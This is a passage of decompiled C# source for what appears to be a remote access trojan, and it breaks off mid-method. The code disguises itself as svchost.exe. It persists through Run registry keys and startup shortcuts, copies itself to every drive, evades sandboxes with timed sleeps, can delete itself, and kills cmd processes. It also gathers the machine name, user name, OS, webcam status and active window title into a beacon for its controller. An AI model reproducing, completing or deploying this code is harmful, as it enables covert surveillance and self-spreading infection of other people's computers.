using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

public class GClass0
{
	private const int int_0 = 0;

	private const int int_1 = 5;

	private bool bool_0;

	private const int int_2 = 64;

	private const int int_3 = 128;

	private WebBrowser webBrowser_0;

	public string string_0;

	public string string_1;

	public string string_2;

	public Mutex mutex_0;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

	public string string_7;

	public bool bool_1;

	public string string_8;

	public bool bool_2;

	public bool bool_3;

	public bool bool_4;

	public bool bool_5;

	public bool bool_6;

	public bool bool_7;

	public bool bool_8;

	public bool bool_9;

	public bool bool_10;

	public bool bool_11;

	public bool bool_12;

	public bool bool_13;

	public bool bool_14;

	public bool bool_15;

	public bool bool_16;

	public GClass2 gclass2_0;

	public string string_9;

	public GClass1 gclass1_0;

	public object object_0;

	private object object_1;

	public bool bool_17;

	public object object_2;

	private string string_10;

	public object object_3;

	public GClass0()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		bool_0 = false;
		webBrowser_0 = new WebBrowser();
		string_0 = "UGF1bG8=";
		string_1 = "1.6.>>";
		string_2 = "";
		mutex_0 = null;
		string_3 = "svchost.exe";
		string_4 = "TEMP";
		string_5 = "ba4c12bee3027d94da5c81db2d196bfd";
		string_6 = "w";
		string_7 = "80";
		bool_1 = Conversions.ToBoolean("False");
		string_8 = "|'|'|";
		bool_2 = Conversions.ToBoolean("False");
		bool_3 = Conversions.ToBoolean("False");
		bool_4 = Conversions.ToBoolean("True");
		bool_5 = Conversions.ToBoolean("False");
		bool_6 = Conversions.ToBoolean("False");
		bool_7 = Conversions.ToBoolean("False");
		bool_8 = Conversions.ToBoolean("False");
		bool_9 = Conversions.ToBoolean("False");
		bool_10 = Conversions.ToBoolean("False");
		bool_11 = Conversions.ToBoolean("False");
		bool_12 = Conversions.ToBoolean("False");
		bool_13 = Conversions.ToBoolean("False");
		bool_14 = Conversions.ToBoolean("False");
		bool_15 = Conversions.ToBoolean("False");
		bool_16 = Conversions.ToBoolean("False");
		gclass2_0 = new GClass2();
		string_9 = "[endof]";
		gclass1_0 = null;
		object_0 = new FileInfo(Application.get_ExecutablePath());
		bool_17 = false;
		object_2 = null;
		string_10 = "";
		object_3 = (object)new Computer();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool BlockInput(bool bool_18);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_11, string string_12);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_4);

	private IntPtr method_0()
	{
		string string_ = "Progman";
		string string_2 = null;
		IntPtr intptr_ = (IntPtr)FindWindowA(ref string_, ref string_2);
		IntPtr intptr_2 = FindWindowEx(intptr_, IntPtr.Zero, "SHELLDLL_DefView", null);
		return FindWindowEx(intptr_2, IntPtr.Zero, "SysListView32", null);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowPos(int int_4, int int_5, int int_6, int int_7, int int_8, int int_9, int int_10);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_1()
	{
		//IL_038d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0397: Expected O, but got Unknown
		if (bool_9)
		{
			try
			{
				Thread.Sleep(20000);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_12)
		{
			try
			{
				Thread.Sleep(150000);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_13)
		{
			try
			{
				Thread.Sleep(1800000);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_14)
		{
			try
			{
				Thread.Sleep(3600000);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_15)
		{
			try
			{
				Interaction.Shell("cmd.exe /k ping google.com & del \"" + Application.get_ExecutablePath() + "\" & exit", (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		string_2 = string_5;
		if (Interaction.Command() != null && Interaction.Command().Length > 0)
		{
			string[] array = Strings.Split(Interaction.Command(), ":", -1, (CompareMethod)0);
			string text = array[0];
			if (Operators.CompareString(text, "UP", false) == 0)
			{
				try
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "!" }, (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				try
				{
					object processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
					NewLateBinding.LateCall(processById, (Type)null, "WaitForExit", new object[1] { 5000 }, (string[])null, (Type[])null, (bool[])null, true);
					try
					{
						NewLateBinding.LateCall(processById, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					Thread.Sleep(5000);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(text, "..", false) == 0)
			{
				Thread.Sleep(5000);
			}
		}
		method_30();
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (method_29(new FileInfo(process.MainModule!.FileName), (FileInfo)object_0) && process.Id > Process.GetCurrentProcess().Id)
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			Mutex.OpenExisting(string_2);
			ProjectData.EndApp();
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, string_2);
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		object obj = new Thread(method_27, 1);
		NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		if (bool_1)
		{
			gclass2_0.string_0 = string_5 + ".exe";
			gclass2_0.method_0();
		}
		try
		{
			gclass1_0 = new GClass1();
			obj = new Thread(gclass1_0.method_3, 1);
			NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		int num = 0;
		int num2 = 0;
		string text2 = "";
		if (bool_2)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					method_18();
				});
				method_24(1);
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
		}
		checked
		{
			if (bool_10)
			{
				try
				{
					Process[] processesByName = Process.GetProcessesByName("LogonUI");
					Process[] array2 = processesByName;
					for (int j = 0; j < array2.Length; j++)
					{
						try
						{
							object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
							objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
							object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "SpecialFolders", new object[1] { "Startup" }, (string[])null, (Type[])null, (bool[])null));
							object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { Operators.ConcatenateObject(objectValue2, (object)"\\E8EIS82NNWBGGSY7UA77BVVDGS-2JMS89S.lnk") }, (string[])null, (Type[])null, (bool[])null));
							NewLateBinding.LateSet(objectValue3, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\E8EIS82NNWBGGSY7UA77BVVDGS-2JMS89S.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(objectValue3, (Type)null, "WorkingDirectory", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\E8EIS82NNWBGGSY7UA77BVVDGS-2JMS89S.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(objectValue3, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(objectValue3, (Type)null, "IconLocation", new object[1] { "%SystemRoot%\\system32\\SHELL32.dll,88" }, (string[])null, (Type[])null);
							NewLateBinding.LateCall(objectValue3, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							DriveInfo[] drives = DriveInfo.GetDrives();
							foreach (DriveInfo driveInfo in drives)
							{
								string text3 = driveInfo.ToString() + ",";
								string[] array3 = Strings.Split(text3, ",", -1, (CompareMethod)0);
								string text4 = "E8EIS82NNWBGGSY7UA77BVVDGS-2JMS89S.EXE";
								int num3 = array3.Rank - 1;
								for (int l = 0; l <= num3; l++)
								{
									File.Copy(Application.get_ExecutablePath(), array3[l] + text4, overwrite: true);
								}
							}
						}
						catch (Exception projectError15)
						{
							ProjectData.SetProjectError(projectError15);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError16)
				{
					ProjectData.SetProjectError(projectError16);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_8)
			{
				try
				{
					Process[] processesByName2 = Process.GetProcessesByName("LogonUI");
					Process[] array4 = processesByName2;
					for (int m = 0; m < array4.Length; m++)
					{
						File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", overwrite: true);
					}
				}
				catch (Exception projectError17)
				{
					ProjectData.SetProjectError(projectError17);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_3)
			{
				try
				{
					File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", overwrite: true);
				}
				catch (Exception projectError18)
				{
					ProjectData.SetProjectError(projectError18);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_4)
			{
				try
				{
					if (!((ServerComputer)Class2.Class1_0).get_Network().get_IsAvailable())
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception projectError19)
				{
					ProjectData.SetProjectError(projectError19);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_5)
			{
				try
				{
					if (!Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86"))
					{
						ProjectData.EndApp();
					}
					return;
				}
				catch (Exception projectError20)
				{
					ProjectData.SetProjectError(projectError20);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_6)
			{
				try
				{
					if (!Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("64"))
					{
						ProjectData.EndApp();
					}
					return;
				}
				catch (Exception projectError21)
				{
					ProjectData.SetProjectError(projectError21);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_7)
			{
				try
				{
					object objectValue4 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					objectValue4 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
					object objectValue5 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue4, (Type)null, "SpecialFolders", new object[1] { "Startup" }, (string[])null, (Type[])null, (bool[])null));
					object objectValue6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue4, (Type)null, "CreateShortcut", new object[1] { Operators.ConcatenateObject(objectValue5, (object)"\\KEJRDGH94EWKFSDKZX8WW8DCXJKWS8DXHFK3WSKWEJSHDF38WERHJESDF837WER.lnk") }, (string[])null, (Type[])null, (bool[])null));
					NewLateBinding.LateSet(objectValue6, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue4, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\KEJRDGH94EWKFSDKZX8WW8DCXJKWS8DXHFK3WSKWEJSHDF38WERHJESDF837WER.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue6, (Type)null, "WorkingDirectory", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue4, (Type)null, "ExpandEnvironmentStrings", new object[1] { "C:\\KEJRDGH94EWKFSDKZX8WW8DCXJKWS8DXHFK3WSKWEJSHDF38WERHJESDF837WER.EXE" }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue6, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue6, (Type)null, "IconLocation", new object[1] { "%SystemRoot%\\system32\\SHELL32.dll,88" }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue6, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					DriveInfo[] drives2 = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo2 in drives2)
					{
						string text5 = driveInfo2.ToString() + ",";
						string[] array5 = Strings.Split(text5, ",", -1, (CompareMethod)0);
						string text6 = "KEJRDGH94EWKFSDKZX8WW8DCXJKWS8DXHFK3WSKWEJSHDF38WERHJESDF837WER.EXE";
						int num4 = array5.Rank - 1;
						for (int num5 = 0; num5 <= num4; num5++)
						{
							File.Copy(Application.get_ExecutablePath(), array5[num5] + text6, overwrite: true);
						}
					}
				}
				catch (Exception projectError22)
				{
					ProjectData.SetProjectError(projectError22);
					ProjectData.ClearProjectError();
				}
			}
			if (bool_11)
			{
				try
				{
					while (true)
					{
						Process[] processesByName3 = Process.GetProcessesByName("cmd");
						Process[] array6 = processesByName3;
						foreach (Process process2 in array6)
						{
							process2.Kill();
						}
						Process[] processesByName4 = Process.GetProcessesByName("cmd.exe");
						Process[] array7 = processesByName4;
						for (int num7 = 0; num7 < array7.Length; num7++)
						{
							bool_11.ToString();
						}
					}
				}
				catch (Exception projectError23)
				{
					ProjectData.SetProjectError(projectError23);
					ProjectData.ClearProjectError();
				}
			}
			while (true)
			{
				Thread.Sleep(1000);
				try
				{
					num++;
					num2++;
					if (num == 5)
					{
						try
						{
							EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
						}
						catch (Exception projectError24)
						{
							ProjectData.SetProjectError(projectError24);
							ProjectData.ClearProjectError();
						}
					}
					if (num > 10)
					{
						num = 0;
						if (bool_17 && Operators.CompareString(method_16(), text2, false) != 0)
						{
							text2 = method_16();
							if (text2 != null && text2.Length > 0)
							{
								method_26("act" + string_8 + text2);
							}
						}
					}
					if (num2 <= 7)
					{
						continue;
					}
					num2 = 0;
					try
					{
						object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array8 = new object[2] { string_10, true };
						object[] array9 = array8;
						bool[] array10 = new bool[2] { true, false };
						object obj3 = NewLateBinding.LateGet(obj2, (Type)null, "OpenSubKey", array9, (string[])null, (Type[])null, array10);
						if (array10[0])
						{
							string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
						object[] array11 = new object[2]
						{
							string_5,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
						};
						object[] array12 = array11;
						bool[] array13 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj3, (Type)null, "SetValue", array12, (string[])null, (Type[])null, array13, true);
						if (array13[0])
						{
							string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array11[0]), typeof(string));
						}
					}
					catch (Exception projectError25)
					{
						ProjectData.SetProjectError(projectError25);
						ProjectData.ClearProjectError();
					}
					try
					{
						object obj4 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array14 = new object[2] { string_10, true };
						object[] array15 = array14;
						bool[] array13 = new bool[2] { true, false };
						object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "OpenSubKey", array15, (string[])null, (Type[])null, array13);
						if (array13[0])
						{
							string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array14[0]), typeof(string));
						}
						object[] array8 = new object[2]
						{
							string_5,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..")
						};
						object[] array16 = array8;
						bool[] array10 = new bool[2] { true, false };
						NewLateBinding.LateCall(obj5, (Type)null, "SetValue", array16, (string[])null, (Type[])null, array10, true);
						if (array10[0])
						{
							string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
						}
					}
					catch (Exception projectError26)
					{
						ProjectData.SetProjectError(projectError26);
						ProjectData.ClearProjectError();
					}
					try
					{
					}
					catch (Exception projectError27)
					{
						ProjectData.SetProjectError(projectError27);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError28)
				{
					ProjectData.SetProjectError(projectError28);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void method_2(string string_11)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[1] { string_11 };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string method_3(string string_11)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_11, "" };
			bool[] array2 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetValue", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				string_11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return Conversions.ToString(obj2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object method_4(string string_11, string string_12)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { "Software\\" + string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { string_11, string_12 };
			bool[] array2 = new bool[2] { true, true };
			NewLateBinding.LateCall(obj, (Type)null, "SetValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			if (array2[1])
			{
				string_12 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_5()
	{
		string text = "lv" + string_8;
		try
		{
			if (Operators.CompareString(method_3("vn"), "", false) == 0)
			{
				string text2 = text;
				string string_ = method_8(ref string_0) + "_" + method_17();
				text = text2 + method_7(ref string_) + string_8;
			}
			else
			{
				string text3 = text;
				string string_ = method_3("vn");
				string string_2 = method_8(ref string_) + "_" + method_17();
				text = text3 + method_7(ref string_2) + string_8;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string string_2 = method_17();
			text = text4 + method_7(ref string_2) + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + string_8;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + string_8;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + string_8;
			ProjectData.ClearProjectError();
		}
		text = text + method_6() + string_8;
		try
		{
			text = text + method_15(7u) + string_8;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text = text + "X" + string_8;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = Conversions.ToString(Operators.AddObject((object)text, NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Info", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OSFullName", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Microsoft", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "Windows", "Win" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "®", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "™", "" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { "  ", " " }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Replace", new object[2] { " Win", "Win" }, (string[])null, (Type[])null, (bool[])null)));
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + string_8) : (text + " x64" + string_8));
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			text += string_8;
			ProjectData.ClearProjectError();
		}
		text = ((!method_14()) ? (text + "*_* No" + string_8) : (text + "^_^ Yes" + string_8));
		text = text + string_1 + string_8;
		text = text + ".." + string_8;
		text = text + method_16() + string_8;
		string text5 = "";
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[2]
				{
					"Software\\" + string_5,
					false
				}, (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					string text6 = Conversions.ToString(enumerator.Current);
					if (text6.Length == 32)
					{
						text5 = text5 + text6 + ",";
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	public string method_6()
	{
		try
		{
			return ((FileInfo)object_0).LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_7(ref string string_11)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_11);
		return Convert.ToBase64String(bytes);
	}

	public string method_8(ref string string_11)
	{
		byte[] bytes = Convert.FromBase64String(string_11);
		return Encoding.UTF8.GetString(bytes);
	}

	public string method_9(int int_4)
	{
		VBMath.Randomize();
		Random random = new Random();
		string text = "";
		string text2 = "abcdefghijklmnopqrstuvwxyz";
		for (int i = 1; i <= int_4; i = checked(i + 1))
		{
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
		}
		return text;
	}

	public byte[] method_10(ref string string_11)
	{
		return Encoding.Default.GetBytes(string_11);
	}

	public string method_11(ref byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public Array method_12(byte[] byte_0, string string_11)
	{
		object obj = new List<byte[]>();
		object obj2 = new MemoryStream();
		object obj3 = new MemoryStream();
		string[] array = Strings.Split(method_11(ref byte_0), string_11, -1, (CompareMethod)0);
		object[] array2 = new object[3]
		{
			byte_0,
			0,
			array[0].Length
		};
		object[] array3 = array2;
		bool[] array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj2, (Type)null, "Write", array3, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
		}
		object[] array5 = checked(new object[3]
		{
			byte_0,
			array[0].Length + string_11.Length,
			byte_0.Length - (array[0].Length + string_11.Length)
		});
		object[] array6 = array5;
		array4 = new bool[3] { true, false, false };
		NewLateBinding.LateCall(obj3, (Type)null, "Write", array6, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
		}
		array2 = new object[1];
		object[] array7 = array2;
		object obj4 = obj2;
		array7[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array5 = array2;
		object[] array8 = array5;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array8, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array5[0]) }, (string[])null, (Type[])null, true, false);
		}
		object[] array9 = new object[1];
		object[] array10 = array9;
		obj4 = obj3;
		array10[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null));
		array2 = array9;
		object[] array11 = array2;
		array4 = new bool[1] { true };
		NewLateBinding.LateCall(obj, (Type)null, "Add", array11, (string[])null, (Type[])null, array4, true);
		if (array4[0])
		{
			NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
		}
		NewLateBinding.LateCall(obj2, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
